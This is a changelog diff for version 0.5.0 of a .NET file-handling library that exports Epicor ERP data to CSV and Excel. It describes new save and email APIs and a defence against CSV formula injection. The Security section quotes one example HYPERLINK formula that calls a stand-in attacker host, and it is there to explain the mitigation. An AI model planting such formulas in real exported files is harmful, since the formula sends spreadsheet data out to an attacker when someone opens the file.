@@ -16,6 +16,64 @@ The project stays on `0.x` until its API is deliberately committed to as stable.
 
 ---
 
+## FileHandling 0.5.0 — 2026-09-15
+
+Splits the file half of this library from the email half, adds a save path so a file can be written somewhere and simply kept, and neutralizes spreadsheet formulas in CSV output. **Breaking:** `EMailMeta` is gone and `EmailReport` has a new signature and return type.
+
+### Added
+
+- **`FileWriter.Save(FileSpec)` — write a file and keep it.** Until now the only way to get a spreadsheet out of Keri was to email one; the file was a side effect of `EmailReport`, written to `%TEMP%` and reachable only as an attachment. `Save` takes a destination, writes there, and returns the path.
+
+  `FileSpec.SavePath` names the folder (blank still means temp, which is right when the file exists only to be attached). A folder that does not exist is a `Write` failure unless `FileSpec.CreateDirectory` is set — creating a directory tree is a decision, not a default. An existing file is never overwritten: the name is uniquified the way a browser names a repeated download, `Report.csv` then `Report (1).csv`. Read the winning name off `OutputPath` rather than recomposing it; the existence check and the write are not atomic, so two processes racing for one folder can still collide.
+
+  `BaseName` is validated as a *name*: blank, directory separators, `:`, `.`/`..`, and anything in `Path.GetInvalidFileNameChars()` are rejected at `Build` with nothing written. This is what stops a base name derived from data — a customer name, a report title — from steering the write out of the destination folder. The composed path is re-checked against the resolved folder before the write as well.
+
+- **`FileSpec` and `MailSpec` replace `EMailMeta`.** `FileSpec` is the file: rows, base name, format, date format, sheet name, header map, save path. `MailSpec` is the delivery: recipients, subject, body, error text — and it *has* a `FileSpec` rather than being one, because a message with no attachment is a legitimate case and inheritance would force an attachment-shaped base onto it.
+
+  The reason for the split is what a save-only caller sees. With one flat model, somebody who only wants a spreadsheet on disk opens IntelliSense and finds `To`, `CC`, `BCC`, `Subject`, `Body`, `From`, `RecipientName` and `SMTPHost` staring back — nine properties that do nothing, in a library that on its own cannot send mail.
+
+- **`MailSpec.AttachmentPath` — attach a file that already exists.** Set it and nothing is built; the named file is attached as-is. This is what makes "save it, then mail it" write the file once instead of twice, and it serves the plainly useful case of mailing a file Keri did not produce.
+
+- **`FileOperationResult` and `FileStage`.** Building and delivering a report is a sequence, and when it fails *which step* failed is usually the whole question — so the result carries the step-by-step breakdown (`Steps`) that `EmailReport` always returned, plus the things a program can actually branch on: `IsSuccess`, `OutputPath`, `ErrorMessage`, and `FailedAt`.
+
+  Deliberately not `OperationResult<T>`: that type lives in `EpicorSvcs`, and reusing it would make a CSV writer depend on the ERP client. `FailedAt` plays the part `FailureStage` plays over there without sharing the type.
+
+  `FileStage` has three failure values — `Build`, `Write`, `Send` — and no `Connect` or `Attach`. Attaching, connecting, authenticating and transmitting all happen inside one SMTP client call that surfaces a single error, so the library cannot tell them apart. A stage label that is only sometimes right is worse than a coarse one, because a caller branching on it has no way to know which time it got.
+
+### Security
+
+- **CSV formula injection (CWE-1236) is mitigated.** A value beginning `=`, `+`, `-`, `@`, tab or carriage return is now prefixed with an apostrophe so a spreadsheet application treats it as text.
+
+  This matters here because of what the library is for. Data reaches Epicor from vendor portals, EDI feeds, and keyboards; a part description reading `=HYPERLINK("http://attacker.example"&A1,"Click")` sits inert in the ERP, gets pulled by a BAQ, written to CSV by Keri, and emailed to somebody who double-clicks it. The injection executes on a machine the person who typed it never touched.
+
+  **Numbers are exempt.** A value that parses as a number is left alone, so `-5.00` stays `-5.00` while `-1+1` is prefixed. Prefixing every negative amount would corrupt every credit, variance and adjustment in the file — a mitigation that breaks the common case to catch the rare one is not a mitigation.
+
+  Off by setting `FileSpec.NeutralizeFormulas` to false, or passing `neutralizeFormulas: false` to `ConvertJArrayToCSV`, for a file a machine parses rather than a person opens. Headers are never prefixed; they are the caller's own text, not source data.
+
+  **Not covered:** the Excel path. Whether ClosedXML's `DataTable` insert treats a leading `=` as a formula or as text has not been verified against 0.105.0, so no claim is made either way. Worth checking before relying on it.
+
+### Changed
+
+- **`EmailReport(EMailMeta, SmtpSettings)` → `EmailReport(MailSpec, SmtpSettings)`, returning `FileOperationResult` instead of `List<string>`.** *Breaking (in-solution).* The step list survives on `FileOperationResult.Steps`; `ToString()` renders a headline plus the breakdown, so `Console.WriteLine(result)` prints what the old `string.Join` printed. `EpicorSvcDemo` is the only call site and was updated.
+
+- **`FileSpec.SheetName` falls back to `BaseName` on read, not on assignment.** `EMailMeta` resolved this in the setter, so assigning the sheet name before the attachment name silently produced an empty sheet name. Order no longer matters.
+
+- **`WriteDataToCSVFile` and `WriteDataToExcelFile` are removed.** *Breaking (in-solution).* `EmailReport` was their only caller and now goes through `FileWriter.Save`. Keeping them would have meant shipping two public ways to write a file where one validates its destination and the other builds a path out of `Path.Combine(Path.GetTempPath(), filename)` and writes wherever that lands — including outside temp, since `Path.Combine` discards the first argument when the second is rooted. The pure renderers (`ConvertJArrayToCSV`, `ConvertJArrayToHTMLTable`, `GetPropertyNames`) stay public; writing goes through `FileWriter`.
+
+- **`EpicorSvcDemo` builds the spreadsheet unconditionally, then offers to email it.** Previously an unconfigured relay skipped building the file at all, so a run without SMTP produced nothing to look at — the Excel half of the module could not be demonstrated without a mail server, though the demo's own text called emailing "an optional downstream step." The file now lands in a `DemoOutput` folder beside the executable and the email step attaches it by path.
+
+- **44 more tests** (231 → 275): `FileSpecTests`, `FileWriterTests` (validation, destination handling, collision numbering, header map end-to-end, and an xlsx write that doubles as the ClosedXML binding-redirect canary), and formula-neutralization cases in `CsvRenderingTests`. `FileWriterTests` writes into a GUID-named folder under temp and removes it on dispose.
+
+### Notes
+
+Carried forward, still not changed: `AttachmentType`/`Format` is compared case-insensitively now but is still the file extension verbatim, so `Format = "CSV"` writes `Report.CSV`. CSV is written as UTF-8 with no byte-order mark, matching what the library has always written — a BOM would help Excel read non-ASCII on a double-click and would upset some strict parsers, so it is a decision worth making deliberately rather than a default worth changing quietly.
+
+Still outstanding from the security review: HTML encoding in `ConvertJArrayToHTMLTable` and the auto-generated email body, the BCC disclosure when `EmailSpecs.EmailBody` is null on the direct `Emailer.Send` path, exception objects serialized into `ExcelReader.WorksheetToJArray`'s return value, and temp files that are never cleaned up.
+
+### Version
+
+- `FileHandling` 0.4.0 → 0.5.0. `EpicorSvcs` (0.7.4), `RESTServices` (0.3.3), and `KeriConfigurator` (0.5.0) are unchanged.
+
 ## FileHandling 0.4.0 — 2026-09-15
 
 Four defects in the file/email module, and the first tests it has ever had. `FileHandling` was the one library the suite did not reference, which is why all four survived this long.
